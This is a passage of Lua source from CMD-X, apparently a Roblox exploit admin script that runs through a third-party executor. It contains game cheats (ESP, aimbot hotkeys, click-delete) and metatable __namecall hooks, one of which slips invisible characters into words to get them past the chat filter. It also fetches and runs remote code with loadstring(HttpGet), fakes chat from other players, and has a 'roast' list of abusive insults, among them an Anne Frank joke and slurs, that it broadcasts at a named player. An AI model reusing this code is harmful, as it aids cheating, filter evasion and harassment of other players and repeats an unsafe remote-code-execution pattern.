				cmdp.PlayersRemoving:Connect(function(v)
					if v == target then
						cmdlp.PlayerGui["ESP"..target.Name]:Destroy()
					end
				end)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unfind()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-",target.Name.." is no longer being found")
				cmdlp.PlayerGui["ESP"..target.Name]:Destroy()
				for x,y in pairs(target.Character:GetChildren()) do
					if y:IsA("BasePart") then
						y.Material = "Plastic"
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.clickdelete()
		if _G.connections.clickdel then
			opx("*","Click delete is already enabled")
			return
		end
		opx("-","Click delete enabled")
		_G.connections.clickdel = cmdm.Button1Up:Connect(function()
			cmdm.Target:Destroy()
		end)
	end

	function useCommand.unclickdelete()
		if not _G.connections.clickdel then
			opx("*","Click delete is not enabled")
			return
		end
		opx("-","Click delete disabled")
		_G.connections.clickdel:Disconnect()
	end

	followedIntoNotify = false

	cmdp.PlayerAdded:connect(function(plr)
		if followedIntoNotify then
			if plr.FollowUserId == cmdlp.UserId then
				opx("-",plr.Name.." followed you into game")
			end
		end
		plr.Chatted:connect(function(msg)
			if logsEnabled == true and #msg < 200 then
				wait(.2)
				CreateLabel(plr.Name,msg)
			end
		end)
	end) 
	for i,v in pairs(cmdp:GetPlayers()) do
		v.Chatted:connect(function(msg)
			if logsEnabled == true and #msg < 200 then
				wait(.2)
				CreateLabel(v.Name,msg)
			end
		end)
	end

	function useCommand.logs()
		logsEnabled = true
		wLogs = false
		pLogs = false
		if logsholding.Visible == false then
			opx("-","Logs have been loaded")
			logsholding.Visible = true
		elseif logsholding.Visible == true then
			opx("-","Logs have been unloaded")
			logsholding.Visible = false
			logsEnabled = false
		end
	end

	function useCommand.time()
		if arguments[2] then
			local URL = ("http://worldclockapi.com/api/json/"..arguments[2].."/now")
			local fuck = game:HttpGet(URL)
			local Http = game:GetService("HttpService"):JSONDecode(fuck)
			local Time = Http.currentDateTime:split("T")[2]:split("-")[1]
			opx("-","The time in "..arguments[2].." is "..Time)
			sayremote:FireServer("The time in "..arguments[2].." is "..Time,"All")
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.removeforces()
		for i,f in pairs(cmdlp.Character:GetDescendants()) do
			if f:IsA("BodyForce") or f:IsA("BodyGyro") or f:IsA("BodyVelocity") or f:IsA("BodyAngularVelocity") or f:IsA("RocketPropulsion") or f:IsA("BodyThrust") then
				f:Destroy()
			end
		end
		opx("-","Removed all forces")
	end

	local audioLogger = false
	function useCommand.audiologger()
		opx("-","Audio logger activated do audiologgersave to stop and save")
		audiologgerids = {}
		audioLogger = true
		while audioLogger do
			wait()
			audioLogPlayers()
			for i,plr in pairs(cmdp:GetDescendants()) do
				if plr:IsA("Sound") then
					if string.len(plr.SoundId) <= 50 then
						local soundSplit = plr.SoundId:split("=")
						if not table.find(audiologgerids, soundSplit[2]) and soundSplit[2] then
							table.insert(audiologgerids, soundSplit[2])
						end
					end
				end
			end
		end
	end

	function useCommand.audiologgersave()
		opx("-","Audio logger stopped, file saved in workspace")
		audioLogger = false
		local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
		local filename = GetName.Name.." audiolog"..math.random(1,10000)
		audioIds = game:GetService("HttpService"):JSONEncode(audiologgerids)
		writefile(filename..".CMD-X", audioIds)
	end

	function useCommand.antilag()
		Confirm("Default","This command is not reversible.")
		if Confirmation == true then
			for i,ws in pairs(workspace:GetDescendants()) do
				if ws:IsA("BasePart") then
					ws.Material = "Plastic"
				elseif ws:IsA("Decal") or ws:IsA("Texture") or ws:IsA("ParticleEmitter") or ws:IsA("Sparkles") or ws:IsA("Fire") or ws:IsA("Smoke") and ws.Name ~= "face" then
					ws:Destroy()
				end
			end
			for i,ws in pairs(workspace:GetChildren()) do
				if ws:IsA("Accessory") or ws:IsA("Tool") then
					ws:Destroy()
				end
			end
			for i,ws in pairs(game.Lighting:GetDescendants()) do
				if ws:IsA("BasePart") then
					ws.Material = "Plastic"
				elseif ws:IsA("Decal") or ws:IsA("Texture") or ws:IsA("ParticleEmitter") or ws:IsA("Sparkles") or ws:IsA("Fire") or ws:IsA("Smoke") then
					ws:Destroy()
				end
			end
			opx("-","Attempted to minimalize lag as much as possible")
		end
	end

	function useCommand.clear()
		for i,ws in pairs(workspace:GetChildren()) do
			if ws:IsA("Accessory") or ws:IsA("Tool") then
				ws:Destroy()
			end
		end
		opx("-","Cleared all hats and gears from client")
	end

	function useCommand.removeterrain()
		workspace.Terrain:Clear()
		opx("-","Removed terrain")
	end

	function useCommand.phone()
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdlp.Backpack)
				tool.Name = "poop123"
				tool.GripPos = Vector3.new(0.4, -0.9, 0)
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
		opx("-","Made your phone holdable")
	end

	function useCommand.compliment()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local compPick = {
					"Them toes lookin cute",
					"You have very nice shoes",
					"If I'm what made your day then you're what made this world go round, along with making it a better place just from being here with everyone else.",
					"You're a nice person, and i hope you have an amazing week",
					"You somewhat made me kinda sorta smile I guess",
					"Your avatar looks awesome",
					"Your name makes me smile",
					"You are the best person ever",
					"If I could I would hug you",
					"You make me happy",
					"You have brightened up my day",
					"You are the most amazing person I've ever met",
					"Your avatar looks nice today",
					"You are an amazing person",
					"You are the king/queen",
					"Don't drop your crown"
				}
				local value = math.random(1,#compPick)
				local picked_value = compPick[value]
				opx("-","You complimented "..target.Name)
				sayremote:FireServer(tostring(picked_value)..", "..target.Name, "All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.roast()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local roastPick = {
					"Anne Frank hid better then you",
					"Go to bed",
					"You need a shower",
					"You look like a barbie doll which i gave a makeover with my markers",
					"Your momma back built like a skate ramp I can do an ollie off her",
					"You look like the 1% of germs that hand-soap doesn't kill",
					"Boy u literally be smelling like tv oil",
					"No wonder your parents hate you",
					"You haven't had any neurological brain development in the last decade",
					"I will build a sandcastle out of your dead nans ashes",
					"Your brain has the capacity of a dried sea sponge",
					"You make me cringe, I literally want to quit this game because of you",
					"Your outfit is horrendous",
					"Your name is horrendous",
					"Your IQ is so low that even scientists cant zoom in on it",
					"You are a femmie",
					"You are fat",
					"You stink of your nans cremation",
					"How many people does it take to screw in a lightbulb? 20 of your kind",
					"I can smell you through the screen",
					"Candy shop got robbed, didn't know you did it",
					"You are poor",
					"Your brain is the size of an average ants",
					"Everything you've worked for, your whole life is embarassing",
					"Go back to school",
					"Are you dumb or just young",
					"You make me feel e-sick",
					"I very much dislike you",
					"Settle along you peasent",
					"You are worth nothing",
					"I hope you suffer",
					"Your words, they make no sense",
					"Please leave the server you cretin",
					"You make me sick",
					"Huh? Didn't know infants could play roblox",
					"I bet you live in a poverty stricken country",
					"You belong in the special ed class",
					"Is it just me or does someone smell, nvm thats just",
					"Is it just me or is someone dumb, nvm thats just",
					"Is it just me or is someone fat, nvm thats just"
				}
				local value = math.random(1,#roastPick)
				local picked_value = roastPick[value]
				opx("-","You roasted "..target.Name)
				sayremote:FireServer(tostring(picked_value)..", "..target.Name, "All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.singinfo()
		opx("-","Showed info for sing command")
		opxL("Sing Info","Step 1: Get your song lyrics\
	Step 2: Remove any blank lines\
	Step 3: Find and remove any swear words\
	Step 4: Put hashtags (#) at the end of each line\
	Step 5: Compress the lines to avoid whitespace errors\
	Step 6: Put your compressed text into a raw data uploading site such as pastebin or hastebin\
	Step 7: Insert the link into the sing command\
	To see a sample of what to do, visit: https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/sing/")
	end

	stopSingMid = false
	function useCommand.sing()
		local check = {
			["genocide"] = true,
			["animethighs"] = true,
			["evilfantasy"] = true,
			["$harkattack"] = true,
			["introversion"] = true,
			["lucy"] = true,
			["tyler"] = true,
			["methhead"] = true,
			["superfuntime"] = true,
			["haha"] = true,
			["diamonds"] = true
		}
		if check[string.lower(arguments[2])] then
			getSong = "https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/sing/"..string.lower(arguments[2])
		else
			getSong = arguments[2]
		end
		local lyricsTable = game:HttpGet(getSong):split("#")
		local songTitle = lyricsTable[1]
		opx("-","Now singing "..songTitle)
		sayremote:FireServer("Now singing "..songTitle, "All")
		table.remove(lyricsTable,1)
		stopSingMid = false
		for i,v in pairs(lyricsTable) do
			if stopSingMid == true then break end
			wait(5)
			if stopSingMid == true then break end
			sayremote:FireServer(v, "All")
		end
		wait(5)
		sayremote:FireServer("Finished singing "..songTitle, "All")
	end

	function useCommand.stopsing()
		stopSingMid = true
		opx("-","Stopped singing")
	end

	function useCommand.deletepos()
		if arguments[2] then
			wpNS = getstring(2)
			for i,v in pairs(WPs) do
				if tostring(v.N) == tostring(wpNS) then
					table.remove(WPs,i)
					updatesaves()
				end
			end
			opx("-","Deleted position "..tostring(wpNS))
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.clearpos()
		WPs = {}
		updatesaves()
		opx("-","Cleared all waypoints")
	end

	function useCommand.nocommands()
		noCMD = true
		opx("-","No commands activated")
	end

	function useCommand.yescommands()
		noCMD = false
		opx("-","No commands de-activated")
	end

	function useCommand.gotopos()
		if arguments[3] then
			local presets = {
				["behind"] = "+",
				["right"] = "+",
				["above"] = "+",
				["infront"] = "-",
				["under"] = "-",
				["left"] = "-"
			}
			local mathstuff = presets[arguments[2]] == "+" and arguments[3] or presets[arguments[2]] == "-" and -arguments[3]
			if mathstuff then
				gotoPosHead = mathstuff
				updatesaves()
				opx("-","GotoPosHead is now "..arguments[2].." "..arguments[3])			
			else
				opx("*","A proper preset is needed")
			end
		else
			opx("*","3 arguments are needed for this command!")
		end
	end

	if keypress and keyrelease then
		keypress = keypress
		keyrelease = keyrelease
	else
		function keypress()
			opx("*","Your exploit does not support keypress.")
		end
		function keyrelease()
			opx("*","Your exploit does not support keypress.")
		end
	end

	local autoKey = false
	function useCommand.autokey()
		if arguments[2]:match('[a-z0-9]') and arguments[3] then
			entered0x = arguments[2]:upper()
			autoKey = true
			opx("-","Now auto keying "..entered0x)
			Key = entered0x:byte()
			while autoKey do
				wait(arguments[3])
				if not cmduis:GetFocusedTextBox() then
					keypress(Key)
					wait(arguments[3])
					keyrelease(Key)
				end
			end
		else
			opx("*","3 arguments are needed for this command!")
		end
	end

	function useCommand.unautokey()
		autoKey = false
		wait(1.1)
		keyrelease(Key)
		opx("-","Stopped autokey")
	end

	function useCommand.swimwalk()
		opx("-","Now infinitely swimming")
		workspace.Gravity = 100
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		cmdlp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end

	function useCommand.instances()
		opx("-","There are "..#game:GetDescendants().." instances in this game")
	end

	function useCommand.loadcustomsclr()
		loadCustoms = {}
		updatesaves()
		opx("-","Cleared loadcustoms")
	end

	function useCommand.antiwrldsgui()
		opx("-","antiwrldsGUI loading")
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/antiwrldsgui/main.lua'),true))()
		opx("-","antiwrldsGUI loaded")
	end

	function useCommand.knife()
		opx("-","If you had a knife in your mouth you are now holding it")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle then
				if hat.Name == "YandereKnife" then
					local tool = Instance.new("Tool", cmdlp.Backpack)
					tool.Name = cmdlp.Name.."'s Blade"
					tool.Parent = cmdp.LocalPlayer.Character
					tool.GripForward = Vector3.new(-0, -0, -1)
					tool.GripPos = Vector3.new(-0.83, -0, 0.11)
					tool.GripRight = Vector3.new(0, -1, 0)
					tool.GripUp = Vector3.new(1, 0, -0)
					local hathandle = hat.Handle
					hathandle:FindFirstChildOfClass("Weld"):Destroy()
					hathandle.Parent = tool
					hathandle.Massless = true
				end
			end
		end
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://74799600"
		local play = cmdlp.Character.Humanoid:LoadAnimation(Anim)
		while wait() do
			for i,v in pairs(cmdlp.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Equipped:Connect(function(Mouse)
						Mouse.Button1Down:Connect(function()
							play:Play()
							wait(1)
							play:Stop()
						end)
					end)
				end
			end
		end
	end

	function useCommand.sai()
		opx("-","If you had sais on your waist you are now holding them")
		for _, hat in pairs(cmdp.LocalPlayer.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				if hat.Name == "Dual SaiAccessory" then
					local tool = Instance.new("Tool", cmdp.LocalPlayer.Backpack)
					tool.Name = cmdlp.Name.."'s Sai"
					tool.Parent = cmdp.LocalPlayer.Character
					tool.GripForward = Vector3.new(0.035, 0.743, 0.669)
					tool.GripPos = Vector3.new(1.46, 0.89, -0.97)
					tool.GripRight = Vector3.new(0.999, -0.026, -0.023)
					tool.GripUp = Vector3.new(-0, -0.669, 0.743)
					local hathandle = hat.Handle
					hathandle:FindFirstChildOfClass("Weld"):Destroy()
					hathandle.Parent = tool
					hathandle.Massless = true
				end
			end
		end
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://185824714"
		local play = cmdlp.Character.Humanoid:LoadAnimation(Anim)
		play:Play()
	end

	function useCommand.present()
		opx("-","If you had a present you are now holding it")
		for _, hat in pairs(cmdp.LocalPlayer.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				local tool = Instance.new("Tool", cmdp.LocalPlayer.Backpack)
				tool.Name = cmdp.LocalPlayer.Name.."s present"
				tool.Parent = cmdp.LocalPlayer.Character
				tool.GripForward = Vector3.new(0, 0, -1)
				tool.GripPos = Vector3.new(-0, -0.54, 0.72)
				tool.GripRight = Vector3.new(1, 0, 0)
				tool.GripUp = Vector3.new(0, 1, 0)
				local hathandle = hat.Handle
				hathandle:FindFirstChildOfClass("Weld"):Destroy()
				hathandle.Parent = tool
				hathandle.Massless = true
			end
		end
	end

	function useCommand.boombox()
		opx("-","If you had a boombox on your back you are now holding it")
		for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
			if hat.Handle ~= nil then
				if hat.Name == "Boomblox Back Boombox" then
					local tool = Instance.new("Tool", cmdlp.Backpack)
					tool.Name = cmdlp.Name.."s boombox"
					tool.Parent = cmdlp.Character
					tool.GripForward = Vector3.new(0.935, 0.354, -0.03)
					tool.GripPos = Vector3.new(1.36, -1.05, 0)
					tool.GripRight = Vector3.new(0.031, 0.003, 1)
					tool.GripUp = Vector3.new(-0.354, 0.935, 0.008)
					local hathandle = hat.Handle
					hathandle:FindFirstChildOfClass("Weld"):Destroy()
					hathandle.Parent = tool
					hathandle.Massless = true
				end
			end
		end
	end

	function useCommand.gearhat()
		for i,tool in pairs(cmdlp.Backpack:GetChildren()) do
			if tool:IsA("Tool") then
				tool.Parent = cmdlp.Backpack
				tool.GripForward = Vector3.new(0, 1, 0)
				tool.GripPos = Vector3.new(1.49, 1.45, -0.97)
				tool.GripRight = Vector3.new(1, 0, 0)
				tool.GripUp = Vector3.new(0, 0, 1)
				tool.Parent = cmdlp.Character
			end
		end
		opx("-","Your gears are now hats")
	end

	function useCommand.bypass()
		if _G.oldhook or _G.soldhook or _G.ssoldhook or _G.sssoldhook or _G.smarthook then
			opx("*", "Bypass is already enabled.")
			return
		end
		_G.oldhook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(event, ...)
			if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
				local args = {...}
				local message = args[1]
				local words = message:split(" ")
				local c = {}
				c[1] = "\219\166\219\138"
				local messagetopass = ""
				for i = 1, #words do
					words[i] = words[i]:sub(1,1)..c[1]..words[i]:sub(2,#words[i])
					messagetopass = messagetopass..words[i].."  "
				end
				return _G.oldhook(event, messagetopass, args[2])
			end
			return _G.oldhook(event, ...)
		end)
		setreadonly(mt, true)
		opx("-", "Bypass enabled.")
	end

	function useCommand.clearcharacter()
		opx("-","Cleared your characters appearance")
		cmdlp:ClearCharacterAppearance()
		cmdlp.Character.Head.face:Destroy()
	end

	function useCommand.antiwindowafk()
		if not getconnections then
			opx("*","Your executor does not support getconnections!")
			return
		end
		for _,v in pairs(getconnections(cmduis.WindowFocused)) do v:Disable() end
		for _,v in pairs(getconnections(cmduis.WindowFocusReleased)) do v:Disable() end
		opx("-","You will no longer window focus afk")
	end

	function useCommand.unantiwindowafk()
		if not getconnections then
			opx("*","Your executor does not support getconnections!")
			return
		end
		for _,v in pairs(getconnections(cmduis.WindowFocused)) do v:Enable() end
		for _,v in pairs(getconnections(cmduis.WindowFocusReleased)) do v:Enable() end
		opx("-","You will now window focus afk")
	end

	function useCommand.nilchatcmds()
		if _G.soldhook or _G.ssoldhook or _G.oldhook or _G.sssoldhook or _G.smarthook then
			opx("*", "Nil ChatCmds is already enabled.")
			return
		end
		_G.soldhook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(event, ...)
			if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
				local args = {...}
				local message = args[1]
				if message:sub(1,#prefix) == prefix or message:sub(1,1) == "." then
					return require(cmdlp.PlayerScripts.ChatScript.ChatMain).MessagePosted:fire(message)
				end
			end
			return _G.soldhook(event, ...)
		end)
		setreadonly(mt, true)
		opx("-", "Nil ChatCmds enabled.")
	end

	function useCommand.smartchat()
		if _G.soldhook or _G.ssoldhook or _G.oldhook or _G.sssoldhook or _G.smarthook then
			opx("*", "Smart chat is already enabled.")
			return
		end
		_G.smarthook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(event, ...)
			if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
				local args = {...}
				local message = args[1]
				message = message:sub(1,1):upper()..message:sub(2,#message)
				if message:sub(#message,#message) ~= "." then
					message = message.."."
				end
				return _G.smarthook(event, message, args[2])
			end
			return _G.smarthook(event, ...)
		end)
		setreadonly(mt, true)
		opx("-", "Smart chat enabled.")
	end

	function useCommand.unsmartchat()
		if not _G.smarthook then
			opx("*", "Smart chat is not enabled.")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.smarthook
		setreadonly(mt, true)
		opx("-", "Smart chat disabled.")
		_G.smarthook = nil
	end

	function useCommand.retardchat()
		if _G.soldhook or _G.ssoldhook or _G.oldhook or _G.sssoldhook or _G.smarthook then
			opx("*", "Retard chat is already enabled.")
			return
		end
		local stringka = {"UwU","uwu","^w^",">w<","(Â´â€¢Ï‰â€¢`)","><",">>",":3",">:3",":D"}
		_G.sssoldhook = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(event, ...)
			if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
				local args = {...}
				local message = args[1]:gsub("l","w"):gsub("L","W"):gsub("r","w"):gsub("n","ny"):split(" ")
				local messagefin = ""
				for i,v in pairs(message) do
					if i == 1 then
						v = (v:sub(1,1).."-"):rep(math.random(1,2))..v:sub(2,#v)
						messagefin = messagefin..v.." "
					else
						messagefin = messagefin..v.." "
					end
				end
				messagefin = messagefin..stringka[math.random(1,#stringka)]
				return _G.sssoldhook(event, messagefin, args[2])
			end
			return _G.sssoldhook(event, ...)
		end)
	end

	function useCommand.unretardchat()
		if not _G.sssoldhook then
			opx("*", "Retard chat is not enabled.")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.sssoldhook
		setreadonly(mt, true)
		opx("-", "Retard chat disabled.")
		_G.sssoldhook = nil
	end

	function useCommand.reverse()
		if arguments[2] then
			opx("-","Now Reversing credit to plaisoundz")
			local reversesettings = {
				delay = arguments[2];
			}

			repeat until game.Players.LocalPlayer.Character
			local rp = game.Players.LocalPlayer.Character.HumanoidRootPart
			local health = game.Players.LocalPlayer.Character.Humanoid.Health
			local Table={rp.CFrame}
			for i=1, #Table do
				for count = 1, reversesettings.delay-1 do
					game:GetService("RunService").RenderStepped:Wait()
					table.insert(Table, rp.CFrame)
				end

				local hyro = Instance.new("BodyGyro")
				hyro.Parent = rp
				hyro.MaxTorque = Vector3.new(1000,1000,1000)
				hyro.D = Vector3.new(0,0,0)

				rp.CFrame = (rp.CFrame)
				local number = reversesettings.delay+1
				for count = 1, reversesettings.delay do
					game:GetService("RunService").RenderStepped:Wait()
					number = number-1
					rp.CFrame = (Table[number])
					hyro.CFrame = (Table[number])
				end
				for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
					if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
						v:Destroy()
					end
				end
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.unbypass()
		if not _G.oldhook then
			opx("*", "Bypass is not enabled.")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.oldhook
		setreadonly(mt, true)
		opx("-", "Bypass disabled.")
		_G.oldhook = nil
	end


	function useCommand.unnilchatcmds()
		if not _G.soldhook then
			opx("*", "Nil ChatCmds is not enabled.")
			return
		end
		setreadonly(mt, false)
		mt.__namecall = _G.soldhook
		setreadonly(mt, true)
		opx("-", "Nil ChatCmds disabled.")
		_G.soldhook = nil
	end

	function useCommand.thirdperson()
		opx("-","Third person enabled")
		cmdlp.CameraMode = "Classic"
	end

	function useCommand.firstperson()
		opx("-","First person enabled")
		cmdlp.CameraMode = "LockFirstPerson"
	end

	function useCommand.xraycamera()
		opx("-","X-Ray camera enabled")
		SavedCamera = {Max = cmdlp.CameraMinZoomDistance, Min = cmdlp.CameraMaxZoomDistance}
		cmdlp.CameraMinZoomDistance = math.huge - math.huge
		cmdlp.CameraMaxZoomDistance = math.huge - math.huge    
	end

	function useCommand.unxraycamera()
		opx("-","X-Ray camera disabled")
		cmdlp.CameraMinZoomDistance = SavedCamera.Min
		cmdlp.CameraMaxZoomDistance = SavedCamera.Max
	end

	local animationlist = {}

	function useCommand.emote()
		if arguments[2] then
			if cmd15(cmdlp) then
				animationdebounce = false
				cmdlp.Character.Animate.Disabled = true
				for i,v in pairs(cmdlp.Character.Humanoid:GetPlayingAnimationTracks()) do
					v:Stop()
				end
				local emote_name = {unpack(arguments)}
				table.remove(emote_name, 1)
				emote_name = table.concat(emote_name, " ")

				lower = string.lower(emote_name)
				for i,animid in pairs(animationlist) do
					if lower == string.sub(string.lower(tostring(i)), 1, #lower) then

						animationdebounce = true
						local Anim = Instance.new("Animation")
						Anim.AnimationId = game:GetObjects("rbxassetid://"..animid)[1].AnimationId
						local anim = cmdlp.Character.Humanoid:LoadAnimation(Anim)
						anim:Play()
						anim:AdjustWeight(10)
						anim.Stopped:Connect(function()
							cmdlp.Character.Animate.Disabled = false
							animationdebounce = false
						end)
						break
					end
				end
				cmdlp.Character.Humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(function()
					if cmdlp.Character.Humanoid.MoveDirection ~= VectorZero and animationdebounce == true then
						for i,v in pairs(cmdlp.Character.Humanoid:GetPlayingAnimationTracks()) do
							v:Stop()
						end
					end
				end)
				opx("-","Now playing emote")
			else
				opx("*","R15 is needed for this command!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.chatframe()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				game:GetService("Chat"):Chat(target.Character.Head,getstring(3),Enum.ChatColor.White)
				game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
					Text = "["..target.Name.."]: "..getstring(3);
					Color = Color3.fromRGB(255,255,255);
					Font = Enum.Font.SourceSansBold;TextSize = 18
				})
				opx("-","Forced "..target.Name.." to say "..getstring(3))
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	local fbc = false
	function useCommand.forcebubblechat()
		fbc = true
		opx("-","Started bubble chat")
		if fbc == true then
			cmdp.PlayerAdded:connect(function(plr)
				plr.Chatted:connect(function(msg)
					if fbc == true then
						game:GetService("Chat"):Chat(plr.Character.Head,msg,Enum.ChatColor.White)
					end
				end)
			end) 
			for i,v in pairs(cmdp:GetPlayers()) do
				v.Chatted:connect(function(msg)
					if fbc == true then
						game:GetService("Chat"):Chat(v.Character.Head,msg,Enum.ChatColor.White)
					end
				end)
			end
		end
	end

	function useCommand.unforcebubblechat()
		fbc = false
		opx("-","Stopped bubble chat")
	end

	local IESPenabled = false
	function useCommand.itemesp()
		opx("-","IESP Enabled")
		IESPenabled = true
		for _,i in pairs(workspace:GetDescendants()) do
			if i:IsA("BasePart") and i.Parent.ClassName ~= "Accessory" then
				local pi = i.Name:lower()
				local z = string.find(pi,"handle")
				local z1 = string.find(pi,"tool")
				local z2 = string.find(pi,"item")
				if z ~= nil or z1 ~= nil or z2 ~= nil then
					IESP(i)
				end
			end
		end
	end

	function useCommand.unitemesp()
		opx("-","IESP Disabled")
		IESPenabled = false
		for _,i in pairs(workspace:GetDescendants()) do
			for a,v in pairs(cmdlp.PlayerGui:GetChildren()) do
				if v.Name == i:GetFullName()..'_IESP' then
					v:Destroy()
				end
			end
		end
	end

	function useCommand.setdiscord()
		if arguments[2] then
			arguments[2] = arguments[2]:gsub('#',' ')
			discordTag = arguments[2]
			updatesaves()
			opx("-","Set discord to "..arguments[2])
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.saydiscord()
		if arguments[2] == "cb" or arguments[2] == "copy" then
			setclipboard(discordTag)
		end
		sayremote:FireServer(discordTag, "All")
		opx("-","Said discord in chat")
	end

	function useCommand.removecustombodyparts()
		if cmd6(cmdlp) then
			opx("-","Removed all custom body parts")
			for i,c in pairs(cmdlp.Character:GetChildren()) do
				if c:IsA("CharacterMesh") then
					c:Destroy()
				end
			end
		else
			opx("*","You need to be R6 for this command!")
		end
	end

	function useCommand.insane()
		if cmdlp.Character:FindFirstChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then
			opx("-","You are now insane")
			local pc = cmdlp.Character
			Spas = Instance.new("Animation")
			Spas.AnimationId = "rbxassetid://33796059"
			insane = pc.Humanoid:LoadAnimation(Spas)
			insane:Play()
			insane:AdjustSpeed(99)
		else
			opx("*","R6 is needed for this command")
		end
	end

	function useCommand.hotkeyaimbot()
		if arguments[2] then
			hotkeyaimbot = arguments[2]
			updatesaves()
			opx("-","Hotkey set to "..arguments[2])
		else
			opx("*","A key is required")
		end
	end

	function useCommand.hotkeyesp()
		if arguments[2] then
			hotkeyesp = arguments[2]
			updatesaves()
			opx("-","Hotkey set to "..arguments[2])
		else
			opx("*","A key is required")
		end
	end

	function useCommand.admindetect()
		Scrollingad:ClearAllChildren()
		if cmdlp.PlayerGui:FindFirstChild("HDAdminGUIs") then
			opx("-","HDADMIN found, make sure to run the command 'admins' in it")
			adframe.Visible = true
			CreateADLabel("","")
			CreateADLabel("","")
			for i,v in pairs(cmdrs.HDAdminClient.Signals.RetrieveServerRanks:InvokeServer()) do
				CreateADLabel(v.Player.Name.." | HDADMIN")
			end
			cmdp.PlayerAdded:Connect(function(JoinedPlayer)
				for i,v in pairs(cmdrs.HDAdminClient.Signals.RetrieveServerRanks:InvokeServer()) do
					if v.Player == JoinedPlayer then
						CreateADLabel(v.Player.Name.." | HDADMIN")
					end
				end
			end)
		elseif workspace:FindFirstChild("Kohl's Admin Infinite") then
			opx("-","KOHL'S found")
			adframe.Visible = true
			CreateADLabel("","")
			CreateADLabel("","")
			for i,v in pairs(cmdrs:GetDescendants()) do
				if v.Name == "log" then
					adminTable = v.Parent:FindFirstChildOfClass("StringValue")
				end
			end
			local adminTableS = {{N = "", I = ""}}
			adminTableS.N = adminTable.Value:split(" ")
			for i,v in pairs(adminTableS.N) do
				adminTableS.N[i] = adminTableS.N[i]:gsub("-","")
				adminTableS.N[i] = adminTableS.N[i]:sub(0,#adminTableS.N[i]-2)
